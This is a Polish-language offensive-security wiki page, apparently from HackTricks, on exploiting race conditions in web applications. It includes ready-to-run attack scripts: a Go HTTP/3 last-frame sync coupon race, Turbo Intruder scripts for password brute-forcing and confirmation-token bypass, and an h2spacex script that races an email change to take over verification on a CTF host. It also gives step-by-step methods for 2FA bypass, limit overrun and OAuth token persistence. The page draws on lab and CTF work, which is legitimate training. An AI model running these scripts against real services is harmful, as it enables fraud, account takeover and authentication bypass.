# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Aby uzyskać dogłębne zrozumienie tej techniki, sprawdź oryginalny raport w [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Ulepszanie ataków Race Condition

Główną przeszkodą w wykorzystaniu race condition jest zapewnienie, że wiele żądań jest obsługiwanych w tym samym czasie, z bardzo małą różnicą w czasie ich przetwarzania — najlepiej poniżej 1ms.

Poniżej znajdziesz kilka technik synchronizacji żądań:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Pozwala wysyłać dwa żądania przez jedno połączenie TCP, zmniejszając wpływ jitteru sieci. Jednak ze względu na zróżnicowanie po stronie serwera, dwa żądania mogą nie wystarczyć do spójnego exploita race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Umożliwia wcześniejsze wysłanie większości części 20–30 żądań, wstrzymując mały fragment, który następnie wysyła się razem, osiągając jednoczesne dotarcie do serwera.

**Przygotowanie do Last-Byte Sync** obejmuje:

1. Wysłanie nagłówków i danych body minus ostatniego bajtu bez kończenia strumienia.
2. Pauza 100ms po początkowym wysłaniu.
3. Wyłączenie TCP_NODELAY, aby skorzystać z algorytmu Nagle'a do grupowania ostatnich ramek.
4. Wysłanie pingów, aby rozgrzać połączenie.

Następne wysłanie wstrzymanych ramek powinno spowodować ich dotarcie w jednym pakiecie, co można zweryfikować za pomocą Wireshark. Ta metoda nie dotyczy plików statycznych, które zwykle nie biorą udziału w atakach RC.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Koncepcja**: HTTP/3 działa na QUIC (UDP). Nie ma tu TCP coalescing ani Nagle'a, więc klasyczny last‑byte sync nie działa w przypadku klientów typu off‑the‑shelf. Zamiast tego trzeba celowo scalić wiele końcowych ramek DATA (FIN) z różnych strumieni QUIC w tym samym datagramie UDP, aby serwer przetworzył wszystkie docelowe żądania w tym samym ticku planisty.
- **Jak to zrobić**: Użyj biblioteki stworzonej do tego celu, która daje kontrolę nad ramkami QUIC. Na przykład H3SpaceX manipuluje quic-go, aby zaimplementować HTTP/3 last‑frame synchronization zarówno dla żądań z body, jak i dla żądań w stylu GET bez body.
- Requests‑with‑body: wysyłaj HEADERS + DATA minus ostatniego bajtu dla N strumieni, a następnie flushuj ostatni bajt każdego strumienia razem.
- GET‑style: twórz fałszywe ramki DATA (lub małe body z Content‑Length) i zakończ wszystkie strumienie w jednym datagramie.
- **Ograniczenia praktyczne**:
- Równoległość jest ograniczona parametrem transportowym QUIC max_streams peer'a (podobnie jak HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). Jeśli jest niski, otwórz wiele połączeń H3 i rozłóż race między nimi.
- Rozmiar datagramu UDP i path MTU ograniczają, ile końcowych ramek strumieni możesz scalić. Biblioteka potrafi podzielić na wiele datagramów w razie potrzeby, ale flush w jednym datagramie jest najbardziej niezawodny.
- **Praktyka**: Istnieją publiczne laboratoria H2/H3 oraz przykładowe exploity dołączone do H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Dostosowywanie do architektury serwera

Zrozumienie architektury celu jest kluczowe. Serwery front-end mogą kierować żądania inaczej, wpływając na czas odpowiedzi. Prewencyjne „rozgrzewanie” połączeń po stronie serwera za pomocą nieistotnych żądań może ujednolicić czasy odpowiedzi.

#### Obsługa blokowania opartego na sesji

Frameworki takie jak PHP's session handler serializują żądania według sesji, co może maskować podatności. Użycie różnych tokenów sesji dla każdego żądania może obejść ten problem.

#### Przezwyciężanie limitów szybkości lub zasobów

Jeśli rozgrzewanie połączeń jest nieskuteczne, celowe wywołanie opóźnień wynikających z rate lub resource limitów serwera WWW poprzez zalewanie go fałszywymi żądaniami może ułatwić single-packet attack, wywołując po stronie serwera opóźnienie sprzyjające warunkom wyścigu.

## Przykłady ataków

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Możesz wysłać żądanie do **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), możesz zmienić w żądaniu wartość, którą chcesz bruteforcować dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i następnie wybrać **`examples/race-single-packer-attack.py`** z rozwijanego menu:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Jeśli zamierzasz **wysyłać różne wartości**, możesz zmodyfikować kod, używając tego, który korzysta z wordlisty ze schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Jeśli serwis nie obsługuje HTTP2 (tylko HTTP1.1), użyj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: W przypadku gdy musisz wysłać żądanie do 1 endpointu, a następnie wiele do innych endpointów, aby wywołać RCE, możesz zmodyfikować skrypt `race-single-packet-attack.py` w następujący sposób:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Jest to również dostępne w **Repeater** przez nową opcję '**Send group in parallel**' w Burp Suite.
- Dla **limit-overrun** możesz po prostu dodać ten sam **request** 50 razy do **group**.
- Dla **connection warming** możesz **dodać** na **początku** **group** kilka **requests** do niestatycznej części serwera WWW.
- Dla **delaying** procesu **pomiędzy** przetwarzaniem **jednego requestu a drugiego** w dwóch etapach (2 substates), możesz **dodać dodatkowe requests pomiędzy** oboma requestami.
- Dla **multi-endpoint** RC możesz zacząć wysyłać **request**, który **przechodzi do hidden state**, a następnie tuż po nim wysłać **50 requests**, które **wykorzystują hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Celem tego skryptu jest zmiana adresu email użytkownika przy jednoczesnym ciągłym sprawdzaniu, aż token weryfikacyjny nowego adresu dotrze do ostatniego emaila (to dlatego, że w kodzie występował RC, w którym można było zmodyfikować email, ale weryfikacja była wysyłana na stary adres, ponieważ zmienna wskazująca email była już wypełniona pierwszym adresem).\
Gdy w otrzymanych emailach znajdziemy słowo "objetivo", wiemy, że otrzymaliśmy token weryfikacyjny zmienionego adresu i kończymy atak.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: notatki o engine i gatingu

- Wybór engine: użyj `Engine.BURP2` na targetach HTTP/2, aby wywołać single‑packet attack; w przypadku HTTP/1.1 przejdź do `Engine.THREADED` lub `Engine.BURP` dla last‑byte sync.
- `gate`/`openGate`: kolejkowanie wielu kopii z `gate='race1'` (lub gate na próbę), które wstrzymują tail każdego requestu; `openGate('race1')` przepuszcza wszystkie taile jednocześnie, dzięki czemu docierają niemal równocześnie.
- Diagnostyka: ujemne timestampy w Turbo Intruder wskazują, że serwer odpowiedział zanim request został w całości wysłany, co dowodzi nakładania się. Jest to oczekiwane w true races.
- Connection warming: wyślij najpierw ping lub kilka nieszkodliwych requestów, aby ustabilizować timingi; opcjonalnie wyłącz `TCP_NODELAY`, aby zachęcić do batchowania finalnych frames.

### Ulepszanie Single Packet Attack

W oryginalnym badaniu wyjaśniono, że ten atak ma limit 1,500 bytes. Jednak w [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), opisano jak można rozszerzyć ograniczenie 1,500 B single packet attack do ograniczenia okna TCP wynoszącego **65,535 B** poprzez użycie fragmentacji na warstwie IP (dzielenie pojedynczego pakietu na wiele pakietów IP) i wysyłanie ich w różnej kolejności, co uniemożliwia złożenie pakietu, dopóki wszystkie fragmenty nie dotrą do serwera. Ta technika pozwoliła badaczowi wysłać 10,000 requestów w około 166ms.

Zauważ, że chociaż to usprawnienie czyni atak bardziej niezawodnym w RC, które wymaga setek/tysięcy pakietów docierających jednocześnie, może mieć też ograniczenia programowe. Niektóre popularne serwery HTTP jak Apache, Nginx i Go mają ścisłe ustawienie `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. Jednak inne, jak NodeJS i nghttp2, mają to nieograniczone.\
To w praktyce oznacza, że Apache będzie rozważał tylko 100 HTTP streamów z jednego połączenia TCP (ograniczając ten RC attack). Dla HTTP/3 analogicznym limitem jest parametr transportowy QUIC’s max_streams – jeśli jest mały, rozłóż swoje race na wiele połączeń QUIC.

Przykłady użycia tej techniki znajdziesz w repo: [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Przed wcześniejszym badaniem używano kilku payloadów, które po prostu próbowały wysyłać pakiety jak najszybciej, aby wywołać RC.

- **Repeater:** Sprawdź przykłady z poprzedniej sekcji.
- **Intruder**: Wyślij **request** do **Intruder**, ustaw **number of threads** na **30** w **Options menu**, wybierz jako payload **Null payloads** i wygeneruj **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

To najprostszy typ race condition, który występuje w miejscach ograniczających liczbę razy, kiedy możesz wykonać dane działanie. Na przykład użycie tego samego kodu rabatowego w sklepie internetowym wielokrotnie. Bardzo prosty przykład można znaleźć w [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**this bug**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariantów tego rodzaju ataku, w tym:

- Wykorzystanie karty podarunkowej wielokrotnie
- Ocenianie produktu wielokrotnie
- Wypłacanie lub przelewanie środków przekraczających saldo konta
- Ponowne użycie pojedynczego rozwiązania CAPTCHA
- Omijanie rate limitu przeciwdziałającego brute-force

### **Hidden substates**

Eksploatacja złożonych race condition często polega na wykorzystaniu krótkich możliwości interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak się do tego zabrać:

1. **Identify Potential Hidden Substates**
- Zacznij od zlokalizowania endpoints, które modyfikują lub wchodzą w interakcję z krytycznymi danymi, takimi jak profile użytkowników lub procesy resetu hasła. Skoncentruj się na:
- **Storage**: Preferuj endpoints, które manipulują trwałymi danymi po stronie serwera zamiast tych, które obsługują dane po stronie klienta.
- **Action**: Szukaj operacji, które modyfikują istniejące dane — są bardziej prawdopodobne do stworzenia warunków podatnych na exploit niż operacje dodające nowe dane.
- **Keying**: Udane ataki zwykle obejmują operacje oparte na tym samym identyfikatorze, np. username lub reset token.
2. **Conduct Initial Probing**
- Przetestuj zidentyfikowane endpoints pod kątem race condition, obserwując wszelkie odchylenia od oczekiwanych wyników. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mogą wskazywać na podatność.
3. **Demonstrate the Vulnerability**
- Zawęź atak do minimalnej liczby żądań potrzebnych do wykorzystania podatności, często są to tylko dwa żądania. Ten krok może wymagać wielokrotnych prób lub automatyzacji z powodu precyzyjnego timingu.

### Time Sensitive Attacks

Precyzja w synchronizacji żądań może ujawnić podatności, zwłaszcza gdy do generowania tokenów bezpieczeństwa używane są przewidywalne metody, takie jak timestamps. Na przykład generowanie password reset tokens na podstawie timestampów może spowodować identyczne tokeny dla jednoczesnych żądań.

**To Exploit:**

- Użyj precyzyjnego timingu, np. ataku pojedynczym pakietem, aby wysłać jednoczesne żądania resetu hasła. Identyczne tokeny wskazują na podatność.

**Example:**

- Poproś o dwa tokeny resetu hasła w tym samym czasie i porównaj je. Zgodne tokeny sugerują błąd w generowaniu tokenów.

**Sprawdź** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **aby to wypróbować.**

## Hidden substates case studies

### Pay & add an Item

**Sprawdź** [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) **aby zobaczyć, jak zapłacić w sklepie i dodać dodatkowy przedmiot, za który nie trzeba będzie zapłacić.**

### Confirm other emails

Idea polega na jednoczesnym zweryfikowaniu adresu e-mail i zmianie go na inny, aby sprawdzić, czy platforma weryfikuje nowy adres.

### Change email to 2 emails addresses Cookie based

Zgodnie z [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab był podatny na przejęcie w ten sposób, ponieważ mógł wysyłać email verification token jednego adresu na drugi.

**Sprawdź** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **aby to wypróbować.**

### Hidden Database states / Confirmation Bypass

Jeśli do dodania informacji do bazy danych używane są 2 różne zapisy, istnieje krótki moment, w którym zapisana jest tylko pierwsza część danych. Na przykład przy tworzeniu użytkownika najpierw mogą zostać zapisane username i password, a dopiero potem token do potwierdzenia nowo utworzonego konta. Oznacza to, że przez krótki czas token do potwierdzenia konta może być null.

Dlatego zarejestrowanie konta i wysłanie kilku żądań z pustym tokenem (`token=` lub `token[]=` lub dowolną inną wariacją`) w celu natychmiastowego potwierdzenia konta może pozwolić na potwierdzenie konta, którego adresu e-mail nie kontrolujesz.

**Sprawdź** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **aby to wypróbować.**

### Bypass 2FA

Poniższy pseudo-kod jest podatny na race condition, ponieważ w bardzo krótkim czasie **2FA nie jest wymuszane** podczas tworzenia sesji:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 — wieczne utrzymanie dostępu

Istnieje kilka [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Usługi te pozwalają utworzyć aplikację i uwierzytelnić użytkowników zarejestrowanych u dostawcy. Aby to zrobić, **client** będzie musiał **permit your application** uzyskać dostęp do części ich danych w **OAUth provider**.\
Czyli do tej pory zwykły login przez google/linkedin/github..., gdzie pojawia się strona z komunikatem: "_Application <InsertCoolName> chce uzyskać dostęp do twoich informacji, czy chcesz na to pozwolić?_"

#### Race Condition w `authorization_code`

Problem pojawia się, gdy zaakceptujesz żądanie i automatycznie zostanie wysłany **`authorization_code`** do złośliwej aplikacji. Następnie ta aplikacja wykorzystuje Race Condition w serwisie OAUth, aby wygenerować więcej niż jedną parę AT/RT (_Authentication Token/Refresh Token_) z **`authorization_code`** dla twojego konta. Zasadniczo nadużyje faktu, że zaakceptowałeś aplikację i jej dostęp do twoich danych, aby utworzyć kilka kont. Jeśli następnie przestaniesz zezwalać aplikacji na dostęp do swoich danych, jedna para AT/RT może zostać usunięta, ale pozostałe nadal będą ważne.

#### Race Condition w `Refresh Token`

Gdy uzyskasz ważny RT, możesz spróbować wykorzystać go do wygenerowania kilku par AT/RT, i nawet jeśli użytkownik cofnie uprawnienia złośliwej aplikacji do dostępu do swoich danych, kilka RT nadal może pozostać ważnych.

## **RC w WebSockets**

- W [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) znajdziesz PoC w Java do wysyłania wiadomości websocket **równolegle**, aby wykorzystać Race Conditions także w Web Sockets.
- Z Burp’s WebSocket Turbo Intruder możesz użyć silnika **THREADED** do uruchomienia wielu połączeń WS i wysyłania payloadów równolegle. Zacznij od oficjalnego przykładu i dostosuj `config()` (liczba wątków) dla współbieżności; to często jest bardziej niezawodne niż grupowanie na jednym połączeniu przy wyścigu stanu po stronie serwera między handlerami WS. Zobacz [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
